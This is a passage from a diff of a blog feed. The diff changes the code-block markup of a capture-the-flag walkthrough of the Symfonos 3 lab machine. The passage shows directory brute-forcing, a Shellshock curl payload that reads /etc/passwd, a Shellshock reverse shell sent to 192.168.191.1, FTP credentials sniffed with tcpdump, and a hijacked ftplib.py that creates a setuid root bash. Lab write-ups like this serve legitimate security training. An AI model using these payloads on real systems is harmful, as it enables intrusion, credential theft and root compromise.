-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">ffuf -ic -c -u http://192.168.191.130/FUZZ/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt | tee ffuf.rootdir
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>ffuf -ic -c -u http://192.168.191.130/FUZZ/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt | tee ffuf.rootdir
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-5.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>With this idea, cgi-bin directory is discovered. This is a nice directory bruteforce tip I&amp;rsquo;ll use going forward. The presence of
 cgi-bin could potentially mean we can have a shellshock vulnerability.&lt;/p>
 &lt;p>Running another bruteforce using the wordlist I created earlier didn&amp;rsquo;t work. I then thought to get a lowercase version of the
 words and try it.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">cewl --lowercase http://192.168.191.130/gate/cerberus/tartarus/research -w words2.txt
-ffuf -ic -c -u http://192.168.191.130/cgi-bin/FUZZ -w words2.txt
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>cewl --lowercase http://192.168.191.130/gate/cerberus/tartarus/research -w words2.txt
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffuf -ic -c -u http://192.168.191.130/cgi-bin/FUZZ -w words2.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-13.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>With the lowercase wordlist, we get underworld.&lt;/p>
 &lt;p>To verify the shellshock vulnerability, we can send this request.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">curl -A &lt;span style="color:#e6db74">&amp;#34;() { :; }; echo; echo; /bin/bash -c &amp;#39;cat /etc/passwd&amp;#39;&amp;#34;&lt;/span> http://192.168.191.130/cgi-bin/underworld
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>curl -A &lt;span style="color:#e6db74">&amp;#34;() { :; }; echo; echo; /bin/bash -c &amp;#39;cat /etc/passwd&amp;#39;&amp;#34;&lt;/span> http://192.168.191.130/cgi-bin/underworld
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-6.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;h1 id="shell-as-cerberus">Shell as cerberus&lt;/h1>
 &lt;p>After verifying this vulnerability, we can get a reverse shell.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">curl -A &lt;span style="color:#e6db74">&amp;#34;() { :; }; echo; echo; /bin/bash -c &amp;#39;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.191.1/9000 0&amp;gt;&amp;amp;1 &amp;amp;&amp;#39;&amp;#34;&lt;/span> http://192.168.191.130/cgi-bin/underworld
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>curl -A &lt;span style="color:#e6db74">&amp;#34;() { :; }; echo; echo; /bin/bash -c &amp;#39;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.191.1/9000 0&amp;gt;&amp;amp;1 &amp;amp;&amp;#39;&amp;#34;&lt;/span> http://192.168.191.130/cgi-bin/underworld
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-7.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>On running id we notice that cerberus is part of pcap group. To figure out what is unique about this group I used the find
 command.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">find / -group pcap -ls 2&amp;gt;/dev/null
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>find / -group pcap -ls 2&amp;gt;/dev/null
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-8.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>This reveals we can run tcpdump, therefore we can sniff network traffic.&lt;/p>
 &lt;p>Before sniffing traffic, I used &lt;a href="https://github.com/DominicBreuker/pspy" target="_blank" rel="noopener">pspy&lt;/a>
@@ -322,25 +327,26 @@ to check for cron jobs and other commands being executed.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-9.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>With this I was able to pick up a cronjob that runs as root. Since ftpclient.py is being executed, I&amp;rsquo;ll sniff ftp
 traffic which isn&amp;rsquo;t typically encrypted.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">tcpdump port &lt;span style="color:#ae81ff">21&lt;/span> -n -i lo -A
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>tcpdump port &lt;span style="color:#ae81ff">21&lt;/span> -n -i lo -A
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-10.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>From the tcpdump traffic we get new credentials, hades : PTpZTfU4vxgzvRBE.&lt;/p>
 &lt;h1 id="privilege-escalation">Privilege Escalation&lt;/h1>
 &lt;p>Using the credentials we login to ssh as hades, running id reveals hades is in gods group.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-14.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>Running find again reveals we have write permissions to /usr/lib/python2.7 folder.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">find / -group gods -ls 2&amp;gt;/dev/null
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>find / -group gods -ls 2&amp;gt;/dev/null
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-15.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>Based on the earlier output of pspy, we saw a cronjob that was running as root and python2.7 was being executed. Therefore we can hijack
 any imports in that ftpclient.py script.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-16.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>Since ftplib is imported, we&amp;rsquo;ll replace ftplib.py with this script&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#f92672">import&lt;/span> os
-os&lt;span style="color:#f92672">.&lt;/span>system(&lt;span style="color:#e6db74">&amp;#39;cp /bin/bash /tmp/bash&amp;#39;&lt;/span>)
-os&lt;span style="color:#f92672">.&lt;/span>system(&lt;span style="color:#e6db74">&amp;#39;chmod +s /tmp/bash&amp;#39;&lt;/span>)
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-py" data-lang="py">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> os
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>os&lt;span style="color:#f92672">.&lt;/span>system(&lt;span style="color:#e6db74">&amp;#39;cp /bin/bash /tmp/bash&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>os&lt;span style="color:#f92672">.&lt;/span>system(&lt;span style="color:#e6db74">&amp;#39;chmod +s /tmp/bash&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-17.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>This will create a setuid bash binary in /tmp. Which can use to gain root privileges.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-18.png" alt="symfonos" class="center" style="border-radius: 8px;" /></content></item></channel></rss>
